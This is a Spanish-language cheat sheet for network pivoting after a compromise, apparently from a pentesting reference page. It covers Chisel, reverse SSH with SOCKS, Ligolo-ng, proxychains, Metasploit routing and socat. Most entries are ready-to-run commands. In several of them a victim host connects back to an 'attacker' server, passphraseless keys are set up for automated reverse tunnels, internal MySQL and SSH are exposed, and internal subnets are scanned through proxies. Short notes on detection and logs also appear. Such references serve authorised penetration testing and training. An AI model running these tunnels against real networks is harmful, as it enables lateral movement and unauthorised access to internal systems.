Pivoting = movimiento lateral en red comprometida. Túneles + proxies para acceder a segmentos no visibles desde tu máquina. Requiere acceso inicial y ejecución remota.
CHISEL — TCP TUNNELS
CHISEL BÁSICO
6CHISEL▾
Tunnel TCP/UDP con compresión. Más rápido y flexible que SSH tunnels.
chisel server -p 8888
Escuchar en puerto 8888
chisel server -p 8888 --reverse
Modo reverse — esperar conexión desde víctima
chisel server --auth user:pass -p 8888
Con autenticación básica
chisel client 192.168.1.100:8888 4000:127.0.0.1:4000
Forward puerto local 4000 → remoto 127.0.0.1:4000
chisel client 192.168.1.100:8888 R:9090:127.0.0.1:3306
Reverse forward — exponer MySQL local en puerto 9090 remoto
chisel client --auth user:pass 192.168.1.100:8888 4000:127.0.0.1:4000
Con credenciales
TROUBLESHOOTING
5DEBUG▾
Errores comunes y soluciones.
Connection refused
Servidor no escucha o firewall bloquea. Verificar: ss -tulpn en servidor, puertos abiertos.
Cannot read handshake: EOF
Versión incompatible o no es Chisel. Usar mismo binario.
Remote address not found
Destino (127.0.0.1:puerto) no existe en red interna. Verificar direccionamiento.
ss -tulpn | grep chisel
Verificar proceso activo y puerto escuchando
./chisel server -p 8888 -v
Verbose — ver conexiones y errores en tiempo real
OUTPUT + DETECCIÓN
3DETEC▾
Qué significa éxito, y rastros en logs.
server> listening on 0.0.0.0:8888
Servidor listo — esperando clientes
client: connected
Cliente conectado exitosamente
Detectable por: netstat (proceso chisel), conexión TCP no TLS, tráfico comprimido patrón conocido
Logs: /var/log/auth.log, process accounting, firewall rules
REVERSE TUNNEL (BASTION)
REVERSE SSH + SOCKS
5REVERSE▾
Víctima conecta a tu servidor, abre túnel inverso. Ideal si target no puede iniciar conexión saliente.
ssh-keygen -t rsa -N "" -f ~/.ssh/pivot_key
Generar key sin passphrase (importante para automatizar)
cat ~/.ssh/pivot_key.pub >> ~/.ssh/authorized_keys
Añadir a authorized_keys en servidor bastion
ssh -i pivot_key -R 9999:127.0.0.1:3306 -N -f attacker@bastion
MySQL remoto disponible en bastion:9999
ssh -i pivot_key -R 7777:127.0.0.1:22 -N -f attacker@bastion
Exponer SSH de víctima — acceso directo
ssh -i pivot_key -D 8888 -N -f attacker@bastion
Dynamic proxy SOCKS5 en puerto 8888 bastion
SOCKS5 PROXY (TUNNEL AS PROXY)
CREAR SOCKS5
3SOCKS▾
Proxy SOCKS5 dinámico = forwarder de tráfico flexible (TCP/DNS/UDP).
ssh -D 1080 -N -f user@pivot_host
Escuchar en localhost:1080 como proxy SOCKS5
curl --socks5 127.0.0.1:1080 http://internal.lan/
Usar proxy desde cliente (curl, proxychains, etc)
ssh -D 0.0.0.0:1080 -N user@pivot_host
Escuchar en todas las interfaces — ATENCIÓN: sin restricciones
MULTI-HOP: CHISEL → SSH → PROXYCHAINS
4MULTI▾
Cadena de túneles: Chisel a pivot1, SSH reverse desde pivot1 a bastion, proxychains en bastion.
1. Establecer Chisel servidor en tu máquina
./chisel server -p 8888
2. Cliente Chisel en pivot1 — conecta y expone SSH local
chisel client attacker:8888 3333:127.0.0.1:22
3. SSH reverse desde pivot1 a bastion (usando túnel Chisel)
ssh -R 7777:127.0.0.1:3333 -N user@bastion (a través de Chisel)
4. En bastion: proxychains socks5 127.0.0.1 1080 → acceso a pivot2
Acceso final a segmento más profundo
TROUBLESHOOTING + DETECCIÓN
4DEBUG▾
Errores comunes en reverse tunnels.
Permission denied (publickey)
Key no en authorized_keys de bastion. Verificar permisos 644 en ~/.ssh/authorized_keys
bind: Address already in use
Puerto ya en uso (lsof -i :puerto). Cambiar puerto o matar proceso anterior.
netstat -tulpn | grep ssh
Ver túneles SSH activos y puertos escuchando
Detectable: SSH backward connection, puertos nuevos en escucha, processo sshd escuchando en bastion
Logs: /var/log/auth.log, failed_login attempts, unusual SSH sessions
LIGOLO-NG — POINT-AND-CLICK PIVOTING
LIGOLO-NG v1.4+
8LIGOLO▾
Tunneling avanzado con GUI interactivo. TUN interface = acceso transparente a red remota (no necesita proxychains).
./ligolo-ng proxy -selfcert -laddr 0.0.0.0:11601
Escuchar conexiones de agentes
./ligolo-ng proxy -selfcert -laddr 0.0.0.0:11601 -autocert
Con auto-certificado TLS (recomendado)
./ligolo-ng agent -connect attacker:11601 -ignore-cert
Desde víctima — conectar a proxy (ignore cert autofirmado)
./ligolo-ng agent -connect attacker:11601 -ignore-cert -verbose
Debug verbose
session
En proxy: listar agentes conectados
session -i 0
Seleccionar agente 0 (ver lista primero)
ifconfig
Ver subnets desde agent (detecta rutas automáticamente)
tunnel_out tun0
Exponer segmento en TUN interface (needs sudo)
SSH TUNNELING — PATRONES AVANZADOS
LOCAL FORWARD (BIND TO LOCAL)
4SSH▾
Puerto local → destino remoto a través de pivot. Acceso desde tu máquina a servicios internos.
ssh -L 3306:db.internal:3306 user@pivot
MySQL interno accesible en localhost:3306
ssh -L 8080:webapp:80 -N -f user@pivot
-N = no shell, -f = background
ssh -L 0.0.0.0:3306:db.internal:3306 user@pivot
ATENCIÓN: escucha en todas las interfaces (vulnerable)
ssh -L 5000:localhost:5000 -L 3306:db.internal:3306 user@pivot
Múltiples forwards en mismo comando
REMOTE FORWARD (EXPOSE LOCAL SERVICE)
3SSH▾
Puerto remoto → localhost. Exponer servicio local en red destino (reverse).
ssh -R 9090:127.0.0.1:4444 user@pivot
Metasploit listener en tu 4444 accesible como pivot:9090
ssh -R 0.0.0.0:9090:127.0.0.1:4444 user@pivot
Escuchar en todas interfaces en pivot (requiere GatewayPorts yes)
ssh -R 127.0.0.1:8888:127.0.0.1:22 user@pivot
SSH local accesible en pivot:8888 — escalada de acceso
DYNAMIC PROXY (SOCKS5)
2SSH▾
Todo tráfico TCP a través de pivot como proxy SOCKS5.
ssh -D 1080 -N user@pivot &
SOCKS proxy en localhost:1080 (modo background)
proxychains nmap -sV -n 10.10.10.0/24
Ejecutar herramientas a través del proxy
PROXYCHAINS — STACK DE PROXIES
CONFIGURACIÓN
5PROXYCHAINS▾
Archivo /etc/proxychains.conf o ~/.proxychains.conf define cadena de proxies.
socks5 127.0.0.1 1080
En proxychains.conf — proxy local SSH SOCKS5
socks5 pivot.internal 1080
Saltar a second pivot (si acceso directo exists)
http 192.168.1.50 8080
HTTP proxy (menos flexible que SOCKS)
proxychains -f ~/.proxychains.conf nmap -sT 10.10.10.5
Usar config personalizada
proxychains curl -v http://internal.lan/
HTTP request a través de proxy stack
⚠️ Proxychains = inyección de LD_PRELOAD. DNS puede filtrarse. Usar con cuidado en auditorías sigilosas.
METASPLOIT — ROUTE + PIVOT
POST-EXPLOIT ROUTING
6METASPLOIT▾
Después de obtener shell — añadir rutas y usar pivot en Metasploit.
route add 10.10.10.0 255.255.255.0 SESSION_ID
En msfconsole — después de session abierta
route print
Ver rutas activas
route delete 10.10.10.0 255.255.255.0 SESSION_ID
Eliminar ruta
use auxiliary/server/socks4a
Crear SOCKS4a proxy en Metasploit (mismo límite: proxychains)
use auxiliary/scanner/smb/smb_version
Scanners = automático usa rutas configuradas
set RHOST 10.10.10.5
Especificar target en subnet interno
SOCAT — UNIX CONNECTOR
RELAY Y TUNNEL
6SOCAT▾
TCP relayer flexible — no cifrado pero lightweight. Útil cuando SSH no disponible.
socat TCP-LISTEN:4000,reuseaddr TCP:127.0.0.1:3306
Listen 4000 → forward 127.0.0.1:3306 (servidor)
socat TCP:127.0.0.1:4000 TCP:remote.lan:3306
Connect local:4000 y relay a remote:3306 (cliente)
socat TCP-LISTEN:1080,reuseaddr SOCKS4A
SOCKS4A proxy (alternativa a SSH -D)
socat TCP-LISTEN:9999,fork TCP:internal.db:3306 &
Fork = multiple concurrent connections
socat TCP-LISTEN:22,reuseaddr,fork TCP:hidden.ssh:22
SSH relay — exponer SSH interno
socat UDP-LISTEN:53,reuseaddr,fork UDP:8.8.8.8:53
DNS relay (TCP y UDP diferentes)
SOCAT vs ALTERNATIVES
4COMPARE▾
Cuándo usar Socat vs otras herramientas.
Socat: Plaintext, lightweight, sin SSH requerido
Vs SSH: SSH es cifrado pero requiere key/pass. Vs Chisel: Chisel comprime, Socat no. Vs Ligolo: Ligolo tiene GUI.
Escenario ideal Socat: Servidor restrictivo, no SSH instalado, necesitas relay rápido de TCP puro
Ejemplo: Windows cmd.exe con netcat replacements
which socat || apt install socat
Verificar disponibilidad (no está en todos lados)
Detectable por: tráfico plaintext, procesos socat visibles, comportamiento de relay obvio en tcpdump
Logs: Nmap, netstat, procesos en ejecución. ZERO cifrado.
TROUBLESHOOTING
3DEBUG▾
Errores y validación.
Address already in use
Puerto ocupado. Ver: lsof -i :puerto. Usar puerto diferente o --SO-REUSEADDR.

Destino no existe o no escucha. Verificar IP:puerto.
socat -d -d TCP-LISTEN:4000 TCP:127.0.0.1:3306
-d -d = verbose debug. Ver qué pasa en tiempo real.
